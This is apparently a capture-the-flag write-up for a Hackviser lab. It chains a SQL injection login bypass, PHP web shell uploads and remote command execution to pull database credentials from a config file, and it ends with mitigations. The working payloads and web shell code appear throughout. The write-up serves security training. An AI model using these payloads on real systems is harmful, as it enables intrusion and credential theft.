---
title: "Bee: SQL Injection → File Upload → Remote Code Execution"
date: 2026-03-29 23:30:00 +0530
categories: [Hackviser, Easy]
tags: [sqli, file-upload, rce, webshell, gobuster, misconfiguration]
platform: Hackviser
author: Shivansh Sharma
image:
  path: /assets/images/posts/sqli.webp
  alt: SQL Injection to File Upload RCE Chain
---

## Overview

This lab demonstrates a full web exploitation chain starting from **SQL Injection**, leading to **authentication bypass**, followed by **file upload vulnerability**, and ending in **Remote Code Execution (RCE)**.

It highlights how multiple vulnerabilities can be combined to fully compromise a web application.

---

## Objective

- Enumerate web services
- Bypass authentication using SQL Injection
- Identify file upload functionality
- Achieve remote command execution
- Extract sensitive data (database credentials)

---

## Reconnaissance

Scan the target for open ports and services:

```bash
nmap -sV <target_ip>
```

**Output**

```
┌──(root㉿kali)-[/home/kelvin/Desktop]
└─# nmap -sV 172.20.14.198
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-29 08:56 -0400
Nmap scan report for 172.20.14.198 (172.20.14.198)
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
3306/tcp open  mysql   MySQL (unauthorized)

Nmap done: 1 IP address (1 host up) scanned in 12.72 seconds
```

Open services:

- Port **80** — HTTP (Apache)
- Port **3306** — MySQL

---

## Web Access Issue & Fix

While accessing the web application, the site failed to load correctly using the IP.

A domain was identified:

```
http://dashboard.innovifyai.hackviser/
```

Add it to `/etc/hosts`:

```bash
echo "<target_ip> dashboard.innovifyai.hackviser" >> /etc/hosts
```

Now access works correctly.

---

## Directory Enumeration

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/big.txt
```

**Output**

```
assets               (Status: 301)
server-status        (Status: 403)
```

No sensitive directories found.

---

## SQL Injection (Authentication Bypass)

A login page is present.

### Initial Issue

- Input field required email format
- Prevented direct payload injection

### Bypass Technique

1. Inspect element
2. Remove the restriction: `type="email"`

### Working Payload

```
' OR 1=1#
```

**Result**

- Successfully bypassed authentication
- Gained access to dashboard

---

## File Upload Vulnerability

Inside the dashboard (`settings.php`), a profile image upload feature is available.

### Test Payload

```bash
echo "<?php system('whoami'); ?>" > shell.php
```

Upload the file and access it:

```
http://dashboard.innovifyai.hackviser/uploads/shell.php
```

**Result**

- Command executed successfully
- Confirms Remote Code Execution

---

## Web Shell Deployment

Upload a more functional web shell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell1.php
```

Access:

```
http://dashboard.innovifyai.hackviser/uploads/shell1.php?cmd=ls
```

**Result:** Full command execution achieved.

---

## Internal Enumeration

List parent directory:

```
?cmd=ls%20-a%20../
```

**Discovered Files**

```
customers.php
db_connect.php
login.php
upload.php
settings.php
```

---

## Sensitive File Discovery

Inspect database configuration:

```
?cmd=cat%20../db_connect.php
```

Although partial output appeared, viewing the page source revealed full credentials:

```php
$servername = "localhost";
$username = "root";
$password = "Root.123!hackviser";
$database = "innovifyai";
```

---

## Proof of Exploitation

- SQL Injection → Authentication bypass
- File upload → Remote Code Execution
- Accessed server file system
- Extracted database credentials

---

## Attack Chain Summary

1. Service enumeration (Nmap)
2. Host resolution fix (`/etc/hosts`)
3. SQL Injection → Login bypass
4. File upload → Web shell
5. Remote command execution
6. Sensitive file access (`db_connect.php`)
7. Credential extraction

---

## Impact

- Full application compromise
- Remote code execution on server
- Exposure of database credentials
- Potential lateral movement via database access
- High risk of data breach

---

## Mitigation

- Use prepared statements to prevent SQL Injection
- Enforce strict input validation
- Restrict file upload types and validate content
- Store uploads outside web root
- Disable execution in upload directories
- Secure sensitive configuration files
- Apply least privilege to database users

---

## Real-World Insight

This lab reflects a very realistic attack chain seen in production systems:

> SQL Injection → Initial foothold → File upload → Code execution → Config file → Credential extraction

Attackers rarely rely on a single vulnerability. Instead, they chain multiple weaknesses to achieve full compromise.

Always think beyond individual bugs and focus on how vulnerabilities connect.